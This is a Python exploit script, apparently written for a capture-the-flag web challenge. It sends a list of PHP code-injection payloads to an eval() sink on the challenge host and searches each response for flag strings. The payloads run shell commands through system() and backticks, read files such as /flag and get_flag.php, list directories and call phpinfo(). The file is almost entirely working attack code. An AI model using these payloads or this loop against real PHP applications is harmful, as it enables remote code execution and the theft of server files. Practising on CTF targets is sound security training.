import urllib.request, urllib.parse, re, html as _html

url = 'http://80-a4a01c12-a957-470b-8673-3ad7af9e202e.challenge.ctfplus.cn'

payloads = [
    # PHP code for eval()
    "echo file_get_contents('get_flag.php');",
    "system('cat get_flag.php');",
    "system('cat /flag');",
    "system('ls -la');",
    "show_source('get_flag.php');",
    "include('get_flag.php');",
    "phpinfo();",
    "print_r(scandir('.'));",
    "print_r(scandir('/'));",
    "echo `cat get_flag.php`;",
    "echo `cat /flag`;",
    "var_dump(file('get_flag.php'));",
]

for p in payloads:
    try:
        data = urllib.parse.urlencode({'a': p}).encode('utf-8')
        req = urllib.request.Request(url, data=data, headers={
            'User-Agent': 'Mozilla/5.0',
            'Content-Type': 'application/x-www-form-urlencoded'
        })
        resp = urllib.request.urlopen(req, timeout=10)
        raw = resp.read().decode('utf-8', errors='replace')
        clean = _html.unescape(re.sub(r'<[^>]+>', '', raw))
        
        # Check for flag patterns
        for pattern in ['flag{', 'CTF{', 'ISCC{', 'Geesec{', 'DASCTF{']:
            idx = clean.find(pattern)
            if idx >= 0:
                # Find end of flag
                end = clean.find('}', idx)
                if end > idx:
                    flag = clean[idx:end+1]
                    print(f"FLAG: {flag}  (payload: {p})")
                else:
                    print(f"PARTIAL: {clean[idx:idx+50]}  (payload: {p})")
                break
        else:
            # Show first 100 chars of clean output (before highlight_file)
            idx = clean.find('get_flag.php')
            snippet = clean[:clean.index('highlight_file')] if 'highlight_file' in clean else clean[:300]
            print(f"[{p[:30]}...] -> {snippet.strip()[:120]}")
    except Exception as e:
        print(f"[{p[:30]}...] ERROR: {e}")
